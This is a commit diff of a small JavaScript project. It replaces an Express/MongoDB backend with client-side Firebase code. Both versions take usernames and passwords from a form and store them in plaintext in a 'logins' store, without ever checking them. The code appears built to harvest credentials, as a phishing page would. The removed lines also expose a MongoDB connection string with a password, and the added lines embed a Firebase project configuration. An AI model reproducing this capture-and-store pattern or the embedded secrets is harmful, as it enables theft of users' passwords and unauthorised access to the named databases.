932397592f00486f2f406763a0b916d7dc881606
Standfirm <standfirmbiokoro79@gmail.com>
2024-01-14 22:06:35 +0100

    Updated

--- index.js
+++ index.js
@@ -1,42 +1,27 @@
-//Include the necessary extensions
+import { initializeApp } from 'firebase/app'
+import { getDatabase, ref, push, get, remove } from 'firebase/database'
 
-const express = require("express");
-const mongoose = require("mongoose");
-const bodyparser = require("body-parser");
-const app = express();
+const appSettings = {
+    apiKey: "AIzaSyCRV4qSf3B5QKjrMP7zIDmXEAgHv6Fd-RY",
+    authDomain: "safiny-387ba.firebaseapp.com",
+    databaseURL: "https://safiny-387ba-default-rtdb.firebaseio.com",
+    projectId: "safiny-387ba",
+    storageBucket: "safiny-387ba.appspot.com",
+    messagingSenderId: "332325490200",
+    appId: "1:332325490200:web:9a8e4474d335a118cffd6d",
+    measurementId: "G-C19PLYGTFY"
+  };
+const app = initializeApp(appSettings)
+const database = getDatabase(app)
+const logins = ref(database)
 
-//encode url
-app.use(bodyparser.urlencoded({extended: true}));
 
-//connecting to mongoDB
-mongoose.connect("mongodb+srv://stanfy79:pro123456@cluster0.nnapghi.mongodb.net/Projext_F", { useNewUrlParser: true }, { useUnifiedTopology: true });
-
-// Create data Schema
-const regSchema = {
-    User: String,
-    Password: String
-}
-
-const Reg = mongoose.model("logins", regSchema);
-
-//To present the html page
-app.get("/", function(req, res) {
-    res.sendFile(__dirname + "/main.html");
-})
-
-//Send data to mongoDB
-app.post("/", function(req, res) {
-    let newReg = new Reg({
-        User: req.body.User,
-        Password: req.body.Password
-    });
-    newReg.save();
-    //Remain on thesame page after submition
-    res.redirect("/");
-})
-
-// To listen on PORT 3000
-
-app.listen(3000, function() {
-    console.log("Listening on 3000");
+document.addEventListener('submit', (e) => {
+    e.preventDefault()
+    const user = document.getElementById('user-input-1')
+    const password = document.getElementById('user-input-2')
+    push(logins, {
+        User: user.value,
+        Password: password.value
+    })
 })
